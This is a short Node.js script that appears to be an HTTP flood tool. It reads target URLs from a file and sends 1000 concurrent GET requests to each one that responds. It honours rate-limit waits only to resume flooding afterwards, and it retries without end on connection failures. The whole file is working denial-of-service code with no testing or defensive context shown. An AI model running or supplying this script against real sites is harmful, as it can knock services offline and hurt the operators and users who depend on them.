const axios = require('axios');
const fs = require('fs');
const urls = fs.readFileSync('urls.txt', 'utf-8').split('\n');

const makeRequest = async (url, index) => {
	try {
		const response = await axios.get(url)
		if (response.status === 200) {
			console.log(`Link ${index + 1}: Sending packages...`);
			await Promise.all(Array.from({ length: 1000 }, () => axios.get(url)));
		};
	} catch (error) {
		if (error.response && error.response.status === 429) {
			const retryAfter = error.response.headers['retry-after'];
			console.log(`Link ${index + 1}: Retrying after ${retryAfter} seconds.`);
			await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
			return makeRequest(url, index);
		};
		if (error.code === 'EHOSTUNREACH' || error.code === 'ETIMEDOUT' || error.code === 'ECONNRESET' || error.code === 'ECONNABORTED' || error.code === 'ENOTFOUND') {
			//console.log(`Link ${index + 1}: Connection failed, retrying...`);
			return makeRequest(url, index);
		} else {
			console.error(`Link ${index + 1}: Error ${error.message}`);
		}
	}
}

urls.forEach(makeRequest);
